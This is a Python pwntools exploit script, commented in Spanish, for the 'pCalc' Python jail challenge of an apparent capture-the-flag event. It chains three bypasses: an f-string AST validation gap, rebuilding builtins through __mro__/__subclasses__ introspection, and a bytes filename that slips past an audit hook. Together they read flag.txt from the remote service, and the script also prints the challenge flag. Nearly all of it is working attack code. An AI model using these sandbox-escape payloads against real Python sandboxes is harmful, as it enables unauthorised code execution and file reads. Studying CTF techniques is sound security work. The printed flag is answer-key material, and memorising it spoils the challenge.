#!/usr/bin/env python3
"""
pCalc - Python Jail Escape via 3 Chained Vulnerabilities
Pragyan CTF 2026

Vulnerabilidades:
1. F-string AST bypass: JoinedStr permitido pero no validado recursivamente
2. Object hierarchy para builtins: Reconstruir __builtins__ via __mro__
3. Bytes path audit bypass: isinstance(args[0], str) falla con bytes

Flag: p_ctf{CHA7C4LCisJUst$HorTf0rcaLCUla70r}
"""
from pwn import *

context.log_level = 'info'

HOST = 'pcalc.ctf.prgy.in'
PORT = 1337

def exploit():
    """
    Exploit que encadena 3 vulnerabilidades para leer flag.txt
    """
    log.info("pCalc - Python Jail Escape")
    log.info("3 vulnerabilidades encadenadas")

    # Conectar al servidor
    log.info(f"Conectando a {HOST}:{PORT}")
    conn = remote(HOST, PORT, ssl=True)

    # Recibir banner
    banner = conn.recvuntil(b'>>> ')
    log.info(f"Banner:\n{banner.decode().strip()}")

    # Construir payload
    # Vuln 1: F-string no validado → podemos ejecutar código arbitrario dentro
    # Vuln 2: Reconstruir builtins via ().__class__.__mro__[1].__subclasses__()
    # Vuln 3: Usar b"flag.txt" (bytes) para bypassear audit hook

    b = '().__class__.__mro__[1].__subclasses__()[118].__init__.__globals__["__builtins__"]'
    payload = f'f\'{{{b}["print"]({b}["open"](b"flag.txt").read())}}\' + 0'

    log.info("\n[*] Payload construido:")
    log.info(f"    {payload}\n")

    log.info("[*] Explicación del payload:")
    log.info("    1. f'{...}' → Código dentro del f-string NO se valida (AST bypass)")
    log.info("    2. ().__class__.__mro__[1].__subclasses__()[118] → Reconstruir builtins")
    log.info("    3. b\"flag.txt\" → Bytes bypassean isinstance(args[0], str) del audit hook")
    log.info("    4. print() → Side effect muestra flag antes del error")
    log.info("    5. + 0 → Hace que el nodo raíz sea BinOp (operación permitida)\n")

    # Enviar payload
    log.info("[>] Enviando payload...")
    conn.sendline(payload.encode())

    # Recibir respuesta
    response = conn.recvall(timeout=2).decode()

    # Mostrar respuesta completa
    log.info("\nRespuesta del servidor:")
    print(response)

    # Extraer y mostrar flag
    if 'p_ctf{' in response:
        flag = response[response.find('p_ctf{'):response.find('}', response.find('p_ctf{'))+1]

        log.info(f"\nFlag: {flag}")

        # Guardar flag
        try:
            with open('/root/ctf/flags.txt', 'a') as f:
                f.write(f"pCalc: {flag}\n")
            log.info("Flag guardada en /root/ctf/flags.txt")
        except:
            pass

        return flag
    else:
        log.error("Flag no encontrada en la respuesta")
        return None

    conn.close()

def test_vulnerabilities():
    """
    Demostrar cada vulnerabilidad individualmente
    """
    log.info("\nDemo: Probando cada vulnerabilidad individualmente")

    # Test 1: F-string AST bypass
    log.info("[Test 1] F-string AST bypass")
    log.info("Sin f-string: '2+2' → Permitido")
    log.info("Con f-string: 'f\"{2+2}\"' → Contenido NO validado")

    conn = remote(HOST, PORT, ssl=True, level='error')
    conn.recvuntil(b'>>> ')
    conn.sendline(b'f"{2+2}" + 0')
    resp = conn.recvall(timeout=1).decode()
    log.info(f"Resultado: {resp.strip()}\n")
    conn.close()

    # Test 2: Reconstruir builtins
    log.info("[Test 2] Reconstruir builtins via object introspection")
    log.info("__builtins__ está vacío, pero podemos acceder via:")
    log.info("().__class__.__mro__[1].__subclasses__()[N].__init__.__globals__")

    conn = remote(HOST, PORT, ssl=True, level='error')
    conn.recvuntil(b'>>> ')
    b = '().__class__.__mro__[1].__subclasses__()[118].__init__.__globals__["__builtins__"]'
    payload = f'0*{b}["len"]({b}["__name__"])'
    conn.sendline(payload.encode())
    resp = conn.recvall(timeout=1).decode()
    log.info(f"Acceso a builtins: {'OK' if 'Error' not in resp else 'FAIL'}\n")
    conn.close()

    # Test 3: Bytes bypass audit hook
    log.info("[Test 3] Audit hook bypass con bytes")
    log.info("Audit hook: if 'flag' in args[0] → Solo chequea strings!")
    log.info("open('flag.txt') → Bloqueado")
    log.info("open(b'flag.txt') → isinstance(args[0], str) = False → ¡Bypass!")

    conn = remote(HOST, PORT, ssl=True, level='error')
    conn.recvuntil(b'>>> ')
    b = '().__class__.__mro__[1].__subclasses__()[118].__init__.__globals__["__builtins__"]'
    payload = f'f\'{{{b}["open"](b"flag.txt")}}\' + 0'
    conn.sendline(payload.encode())
    resp = conn.recvall(timeout=1).decode()
    log.info(f"Bypass: {'OK - archivo abierto' if 'Forbidden' not in resp else 'FAIL - bloqueado'}\n")
    conn.close()

    log.info("\nLas 3 vulnerabilidades funcionan. Ahora las encadenamos:")

if __name__ == '__main__':
    import sys

    if len(sys.argv) > 1 and sys.argv[1] == '--test':
        log.info("Modo demostración de vulnerabilidades")
        test_vulnerabilities()
        input("\nPresiona Enter para ejecutar exploit completo...\n")

    exploit()
